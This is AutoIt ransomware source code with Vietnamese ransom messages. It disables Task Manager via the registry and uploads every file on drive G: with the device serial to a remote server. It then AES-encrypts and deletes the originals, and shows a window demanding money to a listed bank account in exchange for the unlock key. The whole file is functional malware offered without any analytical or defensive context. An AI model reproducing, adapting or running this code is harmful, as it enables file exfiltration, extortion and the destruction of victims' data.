#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=20341-256x256x32.ico
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#RequireAdmin
#include <Crypt.au3>
#include <AutoItConstants.au3>
#include <String.au3>
#include <Array.au3>
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <_HttpRequest.au3>

Global $files
Global $directory = "G:\"
Global $PRIVATE_KEY = "123"
Global $key_name = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Global $value_name = "DisableTaskMgr"
Global $device_id = DriveGetSerial( "c:\" )
Global $domain = ''

#Region ### START Koda GUI section ### Form=
$Form1 = GUICreate("Đưa tiền hoặc mất dữ liệu", 615, 391, -1, -1)
GUISetFont(14, 400, 0, "Segoe UI")
$Label1 = GUICtrlCreateLabel("Mày đã bị hack", 96, 72, 133, 29)
$Label2 = GUICtrlCreateLabel("Chuyển tao 10 cành để lấy mã hoặc say bye dữ liệu", 96, 144, 445, 29)
$Label3 = GUICtrlCreateLabel("STK: 1019822127 VCB", 96, 170, 445, 29)
$Input1 = GUICtrlCreateInput("Nhập mã", 104, 216, 401, 33)
$Label3 = GUICtrlCreateLabel("Mã", 40, 216, 34, 29)
$button = GUICtrlCreateButton("Mở khóa", 240, 288, 147, 57)
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###

;~ ===> Main function
RegWrite($key_name, $value_name, "REG_DWORD", 1)

$files = getAllFiles($directory, 0)
For $file In $files  
  $file_content = FileRead($file)
  $data = base64($file_content)
  $file_path = StringReplace($file, '\', '/')
  _HttpRequest(2, $domain, 'content='&$data&'&file_path='&$file_path&'&device_id='&$device_id)
  _Crypt_EncryptFile($file, $file & 'duataotien', $PRIVATE_KEY, $CALG_AES_256)
  FileDelete($file)
Next
;~ <=== End Main function

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
      MsgBox(16 + 262144, "Lỗi", "Đưa tiền đây rồi tính tiếp")
    Case $button
      $key = GUICtrlRead($Input1)
      If $key == $PRIVATE_KEY Then
        unlockFiles()
        RegDelete($key_name, $value_name)
        MsgBox(16 + 262144, "OK", "Nhớ mặt tao")
        Exit
      Else
        MsgBox(16 + 262144, "Lỗi", "Sai mã mở khóa")
      EndIf
	EndSwitch
WEnd



Func unlockFiles()
  For $file In $files
    _Crypt_DecryptFile($file & 'duataotien', $file, $PRIVATE_KEY, $CALG_AES_256)
    FileDelete($file & 'duataotien')
  Next
EndFunc

Func getAllFiles($path = "", $counter = 0)
  $counter = 0
  $path &= '\'
  Local $list_files = '', $file, $demand_file = FileFindFirstFile($path & '*')
  If $demand_file = -1 Then Return ''

  While 1
    $file = FileFindNextFile($demand_file)
    If @error Then ExitLoop
    If @extended Then
     If $counter >= 10 Then ContinueLoop
     getAllFiles($path & $file, $counter + 1)
    Else
      $files &= $path & $file & "|"
    EndIf
  WEnd
  FileClose($demand_file)

  Return _StringExplode(StringTrimRight($files, 1), "|", 0)
EndFunc

Func base64($string)
    Local $oDM = ObjCreate("Microsoft.XMLDOM")
    If Not IsObj($oDM) Then Return SetError(1, 0, 1)
    Local $oEL = $oDM.createElement("Tmp")
    $oEL.DataType = "bin.base64"
    $oEL.NodeTypedValue = Binary($string)

    Return $oEL.Text
EndFunc
